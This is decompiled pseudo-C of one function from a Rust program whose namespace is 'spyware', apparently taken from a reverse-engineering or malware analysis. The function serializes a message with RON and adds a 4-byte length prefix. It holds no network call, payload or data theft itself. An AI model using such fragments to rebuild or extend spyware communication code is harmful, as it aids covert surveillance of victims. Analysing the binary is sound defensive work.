
  int128_t* spyware::communication::serialization::serialize_message::hd905e118d95099f9(int128_t* arg1, int64_t* arg2)

{
    int32_t var_a8;
    ron::ser::to_string::h9734e6b78e2f568f(&var_a8, arg2);
    int128_t var_98;
    int128_t var_58;
    
    if (var_a8 != 0x21)
    {
        int128_t var_88;
        int128_t var_38 = var_88;
        int128_t var_48 = var_98;
        var_58 = var_a8;
        spyware::communication::serialization::serialize_message::_$u7b$$u7b$closure$u7d$$u7d$::h5049c5cf23312933(&var_58);
        /* no return */
    }
    
    int64_t r15 = *var_98[8];
    int64_t var_68 = r15;
    int128_t var_a0;
    int128_t var_78 = var_a0;
    int64_t rax;
    int64_t rdx;
    rax = alloc::raw_vec::RawVecInner$LT$A$GT$::with_capacity_in::h590fc4c98277c4ad(r15 + 4);
    var_a8 = rax;
    var_a0 = rdx;
    var_98 = 0;
    int32_t var_ac = 0;
    int64_t rax_1 = _$LT$core..ops..range..Range$LT$usize$GT$$u20$as$u20$core..slice..index..SliceIndex$LT$$u5b$T$u5d$$GT$$GT$::index_mut::h7e5c0b070607da95(&var_ac);
    var_58 = _bswap(r15);
    int64_t rbp;
    rbp = 1;
    core::slice::_$LT$impl$u20$$u5b$T$u5d$$GT$::copy_from_slice::h6585e5c92fa374d1(rax_1, 4, 
        &var_58, 4);
    std::io::impls::_$LT$impl$u20$std..io..Write$u20$for$u20$alloc..vec..Vec$LT$u8$C$A$GT$$GT$::write_all::hab29cafd5801f495(&var_a8, &var_ac);
    _$LT$alloc..vec..Vec$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..collect..IntoIterator$GT$::into_iter::hcfccc9d078fd7c1d(&var_58, &var_78);
    _$LT$alloc..vec..Vec$LT$T$C$A$GT$$u20$as$u20$alloc..vec..spec_extend..SpecExtend$LT$T$C$alloc..vec..into_iter..IntoIter$LT$T$GT$$GT$$GT$::spec_extend::hbce3591083c8b697(&var_a8, &var_58);
    arg1[1] = var_98;
    *arg1 = var_a8;
    core::ptr::drop_in_place$LT$spyware..communication..messages..Message$GT$::hdefc99125fc89861(
        arg2);
    return arg1;
}
